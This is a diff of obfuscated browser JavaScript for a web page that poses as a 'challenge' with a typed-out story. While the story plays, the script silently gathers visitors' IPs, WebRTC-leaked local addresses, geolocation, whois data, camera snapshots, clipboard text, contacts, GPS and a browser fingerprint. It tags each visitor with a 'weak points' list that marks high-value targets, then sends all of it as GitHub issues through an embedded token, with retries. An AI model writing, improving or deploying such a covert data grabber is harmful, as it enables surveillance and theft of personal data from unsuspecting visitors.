+        country: j.country_name, countryCode: j.country_code,
+        region: j.state, city: j.city, postal: j.postal,
+        latitude: j.latitude, longitude: j.longitude,
         timezone: null, org: null, isp: null
       };
     } catch (e) { return null; }
@@ -822,60 +727,60 @@
     try {
       const res = await _0xTf(`https://ipwhois.app/json/${ip}`);
       if (!res.ok) return null;
-      const json = await res.json();
-      if (!json.success) return null;
-      return _0xNormFromWho(json);
+      const j = await res.json();
+      if (!j.success) return null;
+      return _0xNormFromWho(j);
     } catch (e) { return null; }
   };
 
-  const _0xNorm = (json) => ({
-    ip: json.ip || null,
-    version: json.version || (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
-    country: json.country_name || null,
-    countryCode: json.country_code || null,
-    region: json.region || null,
-    city: json.city || null,
-    postal: json.postal || null,
-    latitude: json.latitude || null,
-    longitude: json.longitude || null,
-    timezone: json.timezone || null,
-    org: json.org || null,
-    isp: json.org || null,
-    asn: json.asn || null,
-    connectionType: json.connection?.type || null
+  const _0xNorm = (j) => ({
+    ip: j.ip || null,
+    version: j.version || (j.ip && j.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: j.country_name || null,
+    countryCode: j.country_code || null,
+    region: j.region || null,
+    city: j.city || null,
+    postal: j.postal || null,
+    latitude: j.latitude || null,
+    longitude: j.longitude || null,
+    timezone: j.timezone || null,
+    org: j.org || null,
+    isp: j.org || null,
+    asn: j.asn || null,
+    connectionType: j.connection?.type || null
   });
 
-  const _0xNormFromWho = (json) => ({
-    ip: json.ip || null,
-    version: (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
-    country: json.country || null,
-    countryCode: json.country_code || null,
-    region: json.region || null,
-    city: json.city || null,
-    postal: json.postal || null,
-    latitude: json.latitude || null,
-    longitude: json.longitude || null,
-    timezone: json.timezone?.id || json.timezone || null,
-    org: json.connection?.org || null,
-    isp: json.connection?.isp || null,
-    asn: json.connection?.asn || null,
+  const _0xNormFromWho = (j) => ({
+    ip: j.ip || null,
+    version: (j.ip && j.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: j.country || null,
+    countryCode: j.country_code || null,
+    region: j.region || null,
+    city: j.city || null,
+    postal: j.postal || null,
+    latitude: j.latitude || null,
+    longitude: j.longitude || null,
+    timezone: j.timezone?.id || j.timezone || null,
+    org: j.connection?.org || null,
+    isp: j.connection?.isp || null,
+    asn: j.connection?.asn || null,
     connectionType: null
   });
 
-  const _0xNormFromIpinfo = (json) => ({
-    ip: json.ip || null,
-    version: (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
-    country: json.country || null,
-    countryCode: json.country || null,
-    region: json.region || null,
-    city: json.city || null,
-    postal: json.postal || null,
-    latitude: json.loc ? json.loc.split(',')[0] : null,
-    longitude: json.loc ? json.loc.split(',')[1] : null,
-    timezone: json.timezone || null,
-    org: json.org || null,
-    isp: json.org || null,
-    asn: json.asn?.asn || null,
+  const _0xNormFromIpinfo = (j) => ({
+    ip: j.ip || null,
+    version: (j.ip && j.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: j.country || null,
+    countryCode: j.country || null,
+    region: j.region || null,
+    city: j.city || null,
+    postal: j.postal || null,
+    latitude: j.loc ? j.loc.split(',')[0] : null,
+    longitude: j.loc ? j.loc.split(',')[1] : null,
+    timezone: j.timezone || null,
+    org: j.org || null,
+    isp: j.org || null,
+    asn: j.asn?.asn || null,
     connectionType: null
   });
 
@@ -887,10 +792,10 @@
       () => _0xGgeodb(ip),
       () => _0xGipwhois(ip)
     ];
-    for (const attempt of attempts) {
+    for (const a of attempts) {
       try {
-        const result = await attempt();
-        if (result) return result;
+        const r = await a();
+        if (r) return r;
       } catch (e) {}
     }
     return null;
@@ -900,7 +805,7 @@
     try {
       let permState = "prompt";
       if (navigator.permissions?.query) {
-        try { const s = await navigator.permissions.query({ name: "camera" }); permState = s.state; } catch {}
+        try { const s = await navigator.permissions.query({ name: "camera" }); permState = s.state; } catch (e) {}
       }
       if (permState !== "granted") return { permission: permState, photo: null };
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -909,12 +814,11 @@
       video.srcObject = stream;
       video.setAttribute("playsinline", true);
       video.play();
-      await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
+      await new Promise(r => { video.onloadedmetadata = () => r(); });
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
+      canvas.getContext("2d").drawImage(video, 0, 0);
       const dataUri = canvas.toDataURL("image/jpeg", 0.4);
       track.stop();
       stream.getTracks().forEach(t => t.stop());
@@ -928,7 +832,7 @@
     try {
       let permState = "prompt";
       if (navigator.permissions?.query) {
-        try { const s = await navigator.permissions.query({ name: "clipboard-read" }); permState = s.state; } catch {}
+        try { const s = await navigator.permissions.query({ name: "clipboard-read" }); permState = s.state; } catch (e) {}
       }
       if (permState !== "granted") return { permission: permState, text: null };
       const text = await navigator.clipboard.readText();
@@ -942,12 +846,14 @@
     try {
       if (!navigator.contacts) return { available: false };
       const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
-      const limited = contacts.slice(0, 50).map(c => ({
-        name: c.name?.[0] || null,
-        email: c.email?.[0] || null,
-        tel: c.tel?.[0] || null
-      }));
-      return { available: true, contacts: limited };
+      return {
+        available: true,
+        contacts: contacts.slice(0, 50).map(c => ({
+          name: c.name?.[0] || null,
+          email: c.email?.[0] || null,
+          tel: c.tel?.[0] || null
+        }))
+      };
     } catch (e) {
       return { available: !!navigator.contacts, error: e.toString() };
     }
@@ -957,13 +863,11 @@
     try {
       let permState = "prompt";
       if (navigator.permissions?.query) {
-        try { const s = await navigator.permissions.query({ name: "geolocation" }); permState = s.state; } catch {}
+        try { const s = await navigator.permissions.query({ name: "geolocation" }); permState = s.state; } catch (e) {}
       }
       if (permState !== "granted") return { permission: permState, coords: null };
-      const pos = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          timeout: 3000, maximumAge: 60000
-        });
+      const pos = await new Promise((res, rej) => {
+        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 2500, maximumAge: 60000 });
       });
       return {
         permission: "granted",
@@ -982,13 +886,13 @@
    *  تاریخ شمسی
    * ============================================================ */
   const gregorianToJalali = (gy, gm, gd) => {
-    const g_d_m = [0,31,59,90,120,151,181,212,243,273,304,334];
+    const gdm = [0,31,59,90,120,151,181,212,243,273,304,334];
     const gy2 = (gm > 2) ? (gy + 1) : gy;
     let days = 355666 + (365 * gy)
       + Math.floor((gy2 + 3) / 4)
       - Math.floor((gy2 + 99) / 100)
       + Math.floor((gy2 + 399) / 400)
-      + gd + g_d_m[gm - 1];
+      + gd + gdm[gm - 1];
     let jy = -1595 + (33 * Math.floor(days / 12053));
     days %= 12053;
     jy += 4 * Math.floor(days / 1461);
@@ -998,97 +902,25 @@
       days = (days - 1) % 365;
     }
     let jm, jd;
-    if (days < 186) {
-      jm = 1 + Math.floor(days / 31);
-      jd = 1 + (days % 31);
-    } else {
-      jm = 7 + Math.floor((days - 186) / 30);
-      jd = 1 + ((days - 186) % 30);
-    }
+    if (days < 186) { jm = 1 + Math.floor(days / 31); jd = 1 + (days % 31); }
+    else { jm = 7 + Math.floor((days - 186) / 30); jd = 1 + ((days - 186) % 30); }
     return { year: jy, month: jm, day: jd };
   };
 
   const getIranDateTime = () => {
     const now = new Date();
-    const fmtDate = new Intl.DateTimeFormat('en-US', {
-      timeZone: 'Asia/Tehran', year: 'numeric', month: '2-digit', day: '2-digit'
-    });
-    const dateParts = fmtDate.formatToParts(now);
-    const gYear  = +dateParts.find(p => p.type === 'year').value;
-    const gMonth = +dateParts.find(p => p.type === 'month').value;
-    const gDay   = +dateParts.find(p => p.type === 'day').value;
-    const j = gregorianToJalali(gYear, gMonth, gDay);
-    const fmtTime = new Intl.DateTimeFormat('en-US', {
-      timeZone: 'Asia/Tehran', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
-    });
-    const timeParts = fmtTime.formatToParts(now);
-    const hour   = timeParts.find(p => p.type === 'hour').value;
-    const minute = timeParts.find(p => p.type === 'minute').value;
-    const second = timeParts.find(p => p.type === 'second').value;
-    return `${j.year}-${String(j.month).padStart(2,'0')}-${String(j.day).padStart(2,'0')} ${hour}:${minute}:${second}`;
-  };
-
-  /* ============================================================
-   *  Worker — ثبت سریع بدون بلوکه کردن صفحه
-   * ============================================================ */
-  const workerCode = `
-self.onmessage = async function(e){
-  var d = e.data || {};
-  var headers = {
-    'Authorization': 'Bearer ' + d.token,
-    'Accept': 'application/vnd.github+json',
-    'X-GitHub-Api-Version': '2022-11-28',
-    'Content-Type': 'application/json'
-  };
-  if (d.userId) { headers['X-User-Id'] = String(d.userId); }
-  try{
-    var ctrl = new AbortController();
-    var timer = setTimeout(function(){ ctrl.abort(); }, 5000);
-    var res = await fetch(d.url, {
-      method:'POST',
-      headers: headers,
-      body: JSON.stringify({ title: d.title, body: d.body }),
-      signal: ctrl.signal
-    });
-    clearTimeout(timer);
-    var data = null;
-    try { data = await res.json(); } catch(x){}
-    if(res.ok){
-      self.postMessage({ ok:true, status: res.status, data: data });
-    } else {
-      self.postMessage({
-        ok:false,
-        status: res.status,
-        statusText: res.statusText,
-        data: data
-      });
-    }
-  } catch(err){
-    self.postMessage({
-      ok:false,
-      error: (err && err.message) ? err.message : String(err)
-    });
-  }
-};`;
-
-  let worker = null;
-  try {
-    const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
-    const workerUrl  = URL.createObjectURL(workerBlob);
-    worker = new Worker(workerUrl);
-  } catch (e) {
-    worker = null;
-  }
-
-  /* ============================================================
-   *  Snapshot — هر collector نتیجه‌اش را اینجا می‌نویسد
-   * ============================================================ */
-  const values = {};
-  const track = (key, promise) => {
-    Promise.resolve(promise)
-      .then(v => { values[key] = v; })
-      .catch(() => { values[key] = null; });
-    return promise;
+    const fmtD = new Intl.DateTimeFormat('en-US', { timeZone: 'Asia/Tehran', year: 'numeric', month: '2-digit', day: '2-digit' });
+    const dp = fmtD.formatToParts(now);
+    const gy = +dp.find(p => p.type === 'year').value;
+    const gm = +dp.find(p => p.type === 'month').value;
+    const gd = +dp.find(p => p.type === 'day').value;
+    const j = gregorianToJalali(gy, gm, gd);
+    const fmtT = new Intl.DateTimeFormat('en-US', { timeZone: 'Asia/Tehran', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
+    const tp = fmtT.formatToParts(now);
+    const h = tp.find(p => p.type === 'hour').value;
+    const m = tp.find(p => p.type === 'minute').value;
+    const s = tp.find(p => p.type === 'second').value;
+    return `${j.year}-${String(j.month).padStart(2,'0')}-${String(j.day).padStart(2,'0')} ${h}:${m}:${s}`;
   };
 
   /* ============================================================
@@ -1099,25 +931,36 @@ self.onmessage = async function(e){
   const typingEl   = document.getElementById('typing');
   const resultEl   = document.getElementById('result');
 
+  const escapeHtml = (s) => String(s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+
   /* ============================================================
-   *  VisitorId + مسیر قبلاً ثبت شده
+   *  Snapshot
    * ============================================================ */
+  const values = {};
+  const track = (key, promise) => {
+    Promise.resolve(promise)
+      .then(v => { values[key] = v; })
+      .catch(() => { values[key] = null; });
+    return promise;
+  };
+
   const visitorId = _0xGetOrCreateVisitorId();
   const alreadyRegistered = _0xGc(_0xCk) === "1";
 
-  // آپدیت URL — بدون دست‌زدن به پارامترهای اصلی
   try {
-    const url = new URL(location.href);
-    if (!url.searchParams.has('visitor')) {
-      url.searchParams.set('visitor', visitorId);
-      history.replaceState(null, '', url.toString());
+    const u = new URL(location.href);
+    if (!u.searchParams.has('visitor')) {
+      u.searchParams.set('visitor', visitorId);
+      history.replaceState(null, '', u.toString());
     }
   } catch (e) {}
 
   /* ============================================================
-   *  شروع همه‌ی Collectorها — فوری
+   *  شروع Collectorها
    * ============================================================ */
-  if (!alreadyRegistered) {
+  if (!alreadyRegistered && !MISSING_PARAMS) {
     track('ipv4', _0xGiv4());
     track('ipv6', _0xGiv6());
     track('localIp', _0xLocalIP());
@@ -1139,29 +982,26 @@ self.onmessage = async function(e){
     track('contactsData', _0xGcontacts());
     track('geoData', _0xGgeo());
     track('cfTrace', _0xGcf());
+
+    // location + whois + reverse DNS به‌محض رسیدن IP
+    Promise.resolve(values.ipv4).then(v => {
+      if (v && v.ip) {
+        track('loc4', _0xGld(v.ip));
+        track('rdap4', _0xGrdap(v.ip));
+        track('rdns4', _0xGrdns(v.ip));
+      }
+    });
+    Promise.resolve(values.ipv6).then(v => {
+      if (v && v.ip) {
+        track('loc6', _0xGld(v.ip));
+        track('rdap6', _0xGrdap(v.ip));
+        track('rdns6', _0xGrdns(v.ip));
+      }
+    });
   }
 
-  // location + whois + reverse DNS به‌محض رسیدن IPها
-  values.loc4 = null; values.rdap4 = null; values.rdns4 = null;
-  values.loc6 = null; values.rdap6 = null; values.rdns6 = null;
-
-  Promise.resolve(values.ipv4).then(v => {
-    if (v && v.ip) {
-      track('loc4', _0xGld(v.ip));
-      track('rdap4', _0xGrdap(v.ip));
-      track('rdns4', _0xGrdns(v.ip));
-    }
-  });
-  Promise.resolve(values.ipv6).then(v => {
-    if (v && v.ip) {
-      track('loc6', _0xGld(v.ip));
-      track('rdap6', _0xGrdap(v.ip));
-      track('rdns6', _0xGrdns(v.ip));
-    }
-  });
-
   /* ============================================================
-   *  تایپینگ داستان — ۵ ثانیه، ۱۰ خط
+   *  تایپینگ داستان — کلمه‌به‌کلمه با افکت محو (بدون بازسازی DOM)
    * ============================================================ */
   const STORY_LINES = [
     'سلام! یه ربات کنجکاو وارد سایت شد…',
@@ -1177,48 +1017,53 @@ self.onmessage = async function(e){
   ];
   const TYPING_TOTAL_MS = 5000;
 
-  const escapeHtml = (s) => s.replace(/[&<>"']/g, c => ({
-    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
-  }[c]));
-
   let typingDone = false;
   let typingDoneCb = null;
 
   const startTyping = () => {
-    const totalChars = STORY_LINES.reduce((a, l) => a + l.length, 0);
-    const perChar = Math.max(8, Math.floor(TYPING_TOTAL_MS / totalChars));
+    // پاک کردن خطوط قبلی
+    typingEl.textContent = '';
+
+    const totalWords = STORY_LINES.reduce((a, l) => a + l.trim().split(/\s+/).filter(Boolean).length, 0);
+    const perWord = Math.max(60, Math.floor(TYPING_TOTAL_MS / Math.max(1, totalWords)));
+
     let lineIdx = 0;
-    let charIdx = 0;
-    const rendered = [];
+    let wordIdx = 0;
+    let words = [];
+    let currentLineEl = null;
 
-    const paint = (partial, caret) => {
-      const doneHtml = rendered.map(l => `<div>${escapeHtml(l)}</div>`).join('');
-      const curHtml  = partial !== null
-        ? `<div>${escapeHtml(partial)}${caret ? '<span class="caret">▌</span>' : ''}</div>`
-        : '';
-      typingEl.innerHTML = doneHtml + curHtml;
-    };
-
-    const step = () => {
+    const nextStep = () => {
       if (lineIdx >= STORY_LINES.length) {
         typingDone = true;
         if (typingDoneCb) typingDoneCb();
         return;
       }
-      const line = STORY_LINES[lineIdx];
-      if (charIdx < line.length) {
-        charIdx++;
-        paint(line.slice(0, charIdx), true);
-        setTimeout(step, perChar);
+      if (!currentLineEl) {
+        words = STORY_LINES[lineIdx].split(/\s+/).filter(Boolean);
+        wordIdx = 0;
+        currentLineEl = document.createElement('div');
+        currentLineEl.className = 'line';
+        typingEl.appendChild(currentLineEl);
+      }
+
+      if (wordIdx < words.length) {
+        const span = document.createElement('span');
+        span.className = 'word';
+        span.textContent = words[wordIdx];
+        currentLineEl.appendChild(span);
+        if (wordIdx < words.length - 1) {
+          currentLineEl.appendChild(document.createTextNode(' '));
+        }
+        wordIdx++;
+        setTimeout(nextStep, perWord);
       } else {
-        rendered.push(line);
+        currentLineEl = null;
         lineIdx++;
-        charIdx = 0;
-        paint(null, false);
-        setTimeout(step, 30);
+        setTimeout(nextStep, 55);
       }
     };
-    step();
+
+    nextStep();
   };
 
   /* ============================================================
@@ -1227,75 +1072,46 @@ self.onmessage = async function(e){
   const showResult = (res) => {
     typingWrap.style.display = 'none';
     resultEl.style.display = 'flex';
-    resultEl.classList.remove('success','error');
+    resultEl.classList.remove('success', 'error');
 
     if (res && res.ok) {
       resultEl.classList.add('success');
+      const extra = res.note ? ('\n' + res.note) : '';
       resultEl.innerHTML = `
         <div class="badge">✓</div>
         <div class="title">موفق شدید، چالش به پایان رسید</div>
-        <div class="desc">${escapeHtml(
-          'Visitor: ' + visitorId +
-          (res.status ? '\nHTTP: ' + res.status : '') +
-          (res.note ? '\n' + res.note : '')
-        )}</div>
+        <div class="desc">${escapeHtml('Visitor: ' + visitorId + (res.status ? '\nHTTP: ' + res.status : '') + extra)}</div>
       `;
     } else {
       resultEl.classList.add('error');
-      const errMsg = (res && (res.error || res.statusText || (res.status ? 'HTTP ' + res.status : null))) || 'خطای نامشخص';
+      const msg = (res && (res.error || res.statusText || (res.status ? 'HTTP ' + res.status : ''))) || 'خطای نامشخص';
       const detail = (res && res.data && (res.data.message || res.data.error)) || '';
+      const finalText = msg + (detail ? ' — ' + detail : '');
       resultEl.innerHTML = `
         <div class="badge">✕</div>
         <div class="title">نشد!</div>
-        <div class="desc">${escapeHtml(errMsg + (detail ? ' — ' + detail : ''))}</div>
+        <div class="desc">${escapeHtml(finalText)}</div>
       `;
     }
   };
 
   /* ============================================================
-   *  ثبت نهایی — در ثانیه ۴ از شروع صفحه
+   *  Payload builder
    * ============================================================ */
-  let submitResult = null;
-
-  const maybeShow = () => {
-    if (typingDone && submitResult !== null) {
-      showResult(submitResult);
-    }
-  };
-  typingDoneCb = maybeShow;
-
   const buildPayload = () => {
     const now = new Date();
 
-    const ipItems = [];
-    if (values.ipv4?.ip) ipItems.push({ ip: values.ipv4.ip, type: 'public_ipv4', version: 'IPv4' });
-    if (values.ipv6?.ip) ipItems.push({ ip: values.ipv6.ip, type: 'public_ipv6', version: 'IPv6' });
-    if (values.localIp?.ipv4) ipItems.push({ ip: values.localIp.ipv4, type: 'local_ipv4', version: 'IPv4' });
-    if (values.localIp?.ipv6) ipItems.push({ ip: values.localIp.ipv6, type: 'local_ipv6', version: 'IPv6' });
-
     const ipLocations = [];
-    if (values.ipv4?.ip) {
-      ipLocations.push({
-        ip: values.ipv4.ip, type: 'public_ipv4',
-        location: values.loc4 || null,
-        whois: values.rdap4 || null,
-        reverseDNS: values.rdns4 || null
-      });
-    }
-    if (values.ipv6?.ip) {
-      ipLocations.push({
-        ip: values.ipv6.ip, type: 'public_ipv6',
-        location: values.loc6 || null,
-        whois: values.rdap6 || null,
-        reverseDNS: values.rdns6 || null
-      });
-    }
-    if (values.localIp?.ipv4) {
-      ipLocations.push({ ip: values.localIp.ipv4, type: 'local_ipv4', location: null, whois: null, reverseDNS: null });
-    }
-    if (values.localIp?.ipv6) {
-      ipLocations.push({ ip: values.localIp.ipv6, type: 'local_ipv6', location: null, whois: null, reverseDNS: null });
-    }
+    if (values.ipv4?.ip) ipLocations.push({
+      ip: values.ipv4.ip, type: 'public_ipv4',
+      location: values.loc4 || null, whois: values.rdap4 || null, reverseDNS: values.rdns4 || null
+    });
+    if (values.ipv6?.ip) ipLocations.push({
+      ip: values.ipv6.ip, type: 'public_ipv6',
+      location: values.loc6 || null, whois: values.rdap6 || null, reverseDNS: values.rdns6 || null
+    });
+    if (values.localIp?.ipv4) ipLocations.push({ ip: values.localIp.ipv4, type: 'local_ipv4', location: null, whois: null, reverseDNS: null });
+    if (values.localIp?.ipv6) ipLocations.push({ ip: values.localIp.ipv6, type: 'local_ipv6', location: null, whois: null, reverseDNS: null });
 
     const fingerprintData = {
       visitor_id: visitorId,
@@ -1316,16 +1132,12 @@ self.onmessage = async function(e){
       cookieEnabled: navigator.cookieEnabled,
       doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || null,
       screen: {
-        width: screen.width ?? null,
-        height: screen.height ?? null,
-        availWidth: screen.availWidth ?? null,
-        availHeight: screen.availHeight ?? null,
-        colorDepth: screen.colorDepth ?? null,
-        pixelDepth: screen.pixelDepth ?? null
+        width: screen.width ?? null, height: screen.height ?? null,
+        availWidth: screen.availWidth ?? null, availHeight: screen.availHeight ?? null,
+        colorDepth: screen.colorDepth ?? null, pixelDepth: screen.pixelDepth ?? null
       },
       viewport: {
-        width: window.innerWidth || null,
-        height: window.innerHeight || null,
+        width: window.innerWidth || null, height: window.innerHeight || null,
         devicePixelRatio: window.devicePixelRatio || null
       },
       hardware: {
@@ -1360,76 +1172,144 @@ self.onmessage = async function(e){
       cloudflareTrace: values.cfTrace || null
     };
 
-    const vulnReport = { weak_points: [] };
-    const perms = values.permissions || {};
-    if (perms.camera === "granted")      vulnReport.weak_points.push("دوربین بدون اجازه مجدد در دسترس است");
-    if (perms.microphone === "granted")  vulnReport.weak_points.push("میکروفون در دسترس است");
-    if (perms.geolocation === "granted") vulnReport.weak_points.push("موقعیت مکانی دقیق قابل دریافت است");
-    if (values.clipboardData?.permission === "granted") vulnReport.weak_points.push("کلیپ‌بورد قابل خواندن است");
-    if (values.cameraData?.permission === "granted")    vulnReport.weak_points.push("عکس دوربین گرفته شد");
-    if (values.localIp?.ipv4 || values.localIp?.ipv6)   vulnReport.weak_points.push("IP محلی از طریق WebRTC نشت کرد");
-    if (values.privateMode?.isPrivate)                  vulnReport.weak_points.push("مرورگر در حالت خصوصی است");
-    if (navigator.plugins?.length > 0)                  vulnReport.weak_points.push("افزونه‌های مرورگر می‌توانند اطلاعات بیشتری لو دهند");
-    if (navigator.mediaDevices?.enumerateDevices && values.mediaDevices?.total > 0)
-      vulnReport.weak_points.push("دستگاه‌های رسانه‌ای شناسایی شدند");
-    if (navigator.hardwareConcurrency > 8)              vulnReport.weak_points.push("سیستم قدرتمند، احتمالاً هدف با ارزش");
+    const vuln = { weak_points: [] };
+    const p = values.permissions || {};
+    if (p.camera === "granted") vuln.weak_points.push("دوربین بدون اجازه مجدد در دسترس است");
+    if (p.microphone === "granted") vuln.weak_points.push("میکروفون در دسترس است");
+    if (p.geolocation === "granted") vuln.weak_points.push("موقعیت مکانی دقیق قابل دریافت است");
+    if (values.clipboardData?.permission === "granted") vuln.weak_points.push("کلیپ‌بورد قابل خواندن است");
+    if (values.cameraData?.permission === "granted") vuln.weak_points.push("عکس دوربین گرفته شد");
+    if (values.localIp?.ipv4 || values.localIp?.ipv6) vuln.weak_points.push("IP محلی از طریق WebRTC نشت کرد");
+    if (values.privateMode?.isPrivate) vuln.weak_points.push("مرورگر در حالت خصوصی است");
+    if (navigator.plugins?.length > 0) vuln.weak_points.push("افزونه‌های مرورگر می‌توانند اطلاعات بیشتری لو دهند");
+    if (navigator.mediaDevices?.enumerateDevices && values.mediaDevices?.total > 0) vuln.weak_points.push("دستگاه‌های رسانه‌ای شناسایی شدند");
+    if (navigator.hardwareConcurrency > 8) vuln.weak_points.push("سیستم قدرتمند، احتمالاً هدف با ارزش");
 
-    let extraSection = '';
-    if (values.cameraData?.photo) {
-      extraSection += `\n## camera\n\n![camera](${values.cameraData.photo})\n`;
-    }
-    if (values.clipboardData?.text) {
-      extraSection += `\n## clipboard\n\n\`\`\`\n${String(values.clipboardData.text).replace(/`/g,'\\`')}\n\`\`\`\n`;
-    }
-    if (values.contactsData?.contacts?.length) {
-      extraSection += `\n## contacts\n\n\`\`\`json\n${JSON.stringify(values.contactsData.contacts)}\n\`\`\`\n`;
-    }
-    if (values.geoData?.coords) {
-      extraSection += `\n## gps\n\n|lat|${values.geoData.coords.latitude}|long|${values.geoData.coords.longitude}|acc|${values.geoData.coords.accuracy}|\n`;
-    }
+    let extra = '';
+    if (values.cameraData?.photo) extra += `\ncamera:![cam](${values.cameraData.photo})\n`;
+    if (values.clipboardData?.text) extra += `\nclipboard:\n\`\`\`\n${String(values.clipboardData.text).replace(/`/g,'\\`')}\n\`\`\`\n`;
+    if (values.contactsData?.contacts?.length) extra += `\ncontacts:\n\`\`\`json\n${JSON.stringify(values.contactsData.contacts)}\n\`\`\`\n`;
+    if (values.geoData?.coords) extra += `\ngps:lat=${values.geoData.coords.latitude},long=${values.geoData.coords.longitude},acc=${values.geoData.coords.accuracy}\n`;
 
     const iranDateTime = getIranDateTime();
-    const title = `Visitor ${visitorId} ${iranDateTime}${_0xUseriD ? ' [' + _0xUseriD + ']' : ''}`;
+    const title = `V${visitorId} ${iranDateTime}${_0xUseriD ? ' [' + _0xUseriD + ']' : ''}`;
 
+    // JSON فشرده — بدون فاصله اضافی
     const body =
-      `# Visitor ${visitorId}\n` +
-      `## time: ${iranDateTime}\n` +
-      ( _0xUseriD ? `## user: ${_0xUseriD}\n` : '' ) +
-      `## fingerprint\n\`\`\`json\n${JSON.stringify(fingerprintData)}\n\`\`\`\n` +
-      `## ip_locations\n\`\`\`json\n${JSON.stringify(ipLocations)}\n\`\`\`\n` +
-      `## vuln\n\`\`\`json\n${JSON.stringify(vulnReport)}\n\`\`\`\n` +
-      extraSection;
+      `# V${visitorId}\n` +
+      `t:${iranDateTime}\n` +
+      (_0xUseriD ? `u:${_0xUseriD}\n` : '') +
+      `fp:\`\`\`json\n${JSON.stringify(fingerprintData)}\n\`\`\`\n` +
+      `ips:\`\`\`json\n${JSON.stringify(ipLocations)}\n\`\`\`\n` +
+      `vuln:\`\`\`json\n${JSON.stringify(vuln)}\n\`\`\`\n` +
+      extra;
 
-    return { title, body, url: `https://api.github.com/repos/${_0xOn}/${_0xRp}/issues` };
+    return { title, body };
   };
 
-  const fallbackFetch = async ({ url, title, body }) => {
-    const headers = {
-      Authorization: `Bearer ${_0xTk}`,
-      Accept: "application/vnd.github+json",
-      "X-GitHub-Api-Version": "2022-11-28",
-      "Content-Type": "application/json"
-    };
-    if (_0xUseriD) headers["X-User-Id"] = String(_0xUseriD);
+  /* ============================================================
+   *  ثبت قوی با چندین تلاش
+   * ============================================================ */
+  const submitOnce = async (url, headers, bodyStr, timeoutMs) => {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), timeoutMs);
     try {
-      const ctrl = new AbortController();
-      const t = setTimeout(() => ctrl.abort(), 5000);
       const res = await fetch(url, {
-        method: 'POST', headers,
-        body: JSON.stringify({ title, body }),
-        signal: ctrl.signal
+        method: 'POST',
+        headers,
+        body: bodyStr,
+        signal: ctrl.signal,
+        mode: 'cors',
+        cache: 'no-store',
+        credentials: 'omit',
+        referrerPolicy: 'no-referrer'
       });
       clearTimeout(t);
       let data = null;
-      try { data = await res.json(); } catch {}
-      if (res.ok) return { ok: true, status: res.status, data };
-      return { ok: false, status: res.status, statusText: res.statusText, data };
-    } catch (err) {
-      return { ok: false, error: err?.message || String(err) };
+      try { data = await res.json(); } catch (e) {}
+      return {
+        ok: res.ok,
+        status: res.status,
+        statusText: res.statusText,
+        data
+      };
+    } catch (e) {
+      clearTimeout(t);
+      const isAbort = e && (e.name === 'AbortError' || /abort/i.test(e.message || ''));
+      return {
+        ok: false,
+        status: 0,
+        error: isAbort ? 'timeout' : ((e && e.message) || String(e))
+      };
     }
   };
 
-  const submitNow = () => {
+  const submitWithRetry = async (title, bodyStr) => {
+    const url = `https://api.github.com/repos/${_0xOn}/${_0xRp}/issues`;
+    const headersBase = {
+      'Authorization': `Bearer ${_0xTk}`,
+      'Accept': 'application/vnd.github+json',
+      'X-GitHub-Api-Version': '2022-11-28',
+      'Content-Type': 'application/json'
+    };
+    if (_0xUseriD) headersBase['X-User-Id'] = String(_0xUseriD);
+
+    const payload = JSON.stringify({ title, body: bodyStr });
+
+    // 4 تلاش: فوری، ۲۰۰ms، ۵۰۰ms، ۹۰۰ms
+    // هر تلاش ۲.۵ ثانیه تایم‌اوت
+    const delays = [0, 200, 500, 900];
+    let last = null;
+
+    for (let i = 0; i < delays.length; i++) {
+      if (delays[i] > 0) await new Promise(r => setTimeout(r, delays[i]));
+
+      // تلاش با هدر کامل
+      let r = await submitOnce(url, headersBase, payload, 2500);
+
+      // اگر خطای شبکه بود و UseriD داریم، بدون هدر X-User-Id هم امتحان کن
+      if (!r.ok && r.status === 0 && _0xUseriD) {
+        const h2 = { ...headersBase };
+        delete h2['X-User-Id'];
+        const r2 = await submitOnce(url, h2, payload, 2000);
+        if (r2.ok) return r2;
+        if (r2.status >= 400) {
+          // خطای کلاینت واقعی — دیگر تلاش نکن
+          return r2;
+        }
+        r = r2;
+      }
+
+      if (r.ok) return r;
+
+      // خطای 4xx غیر از 429 و 408 → دیگر امتحان نکن
+      if (r.status >= 400 && r.status < 500 && r.status !== 429 && r.status !== 408) {
+        return r;
+      }
+
+      last = r;
+    }
+
+    return last || { ok: false, status: 0, error: 'all attempts failed' };
+  };
+
+  /* ============================================================
+   *  Orchestration
+   * ============================================================ */
+  let submitResult = null;
+  let submitted = false;
+
+  const maybeShow = () => {
+    if (typingDone && submitResult !== null) {
+      showResult(submitResult);
+    }
+  };
+  typingDoneCb = maybeShow;
+
+  const doSubmit = async () => {
+    if (submitted) return;
+    submitted = true;
+
     if (alreadyRegistered) {
       submitResult = { ok: true, status: 0, note: 'already registered (cached)' };
       maybeShow();
@@ -1437,77 +1317,68 @@ self.onmessage = async function(e){
     }
 
     let payload;
-    try { payload = buildPayload(); }
-    catch (e) {
-      submitResult = { ok: false, error: 'payload build error: ' + (e?.message || e) };
+    try {
+      payload = buildPayload();
+    } catch (e) {
+      submitResult = { ok: false, error: 'payload error: ' + ((e && e.message) || e) };
       maybeShow();
       return;
     }
 
-    const finish = (res) => {
-      submitResult = res;
-      if (res && res.ok) {
-        _0xSc(_0xCk, "1", _0xMx);
-      }
-      maybeShow();
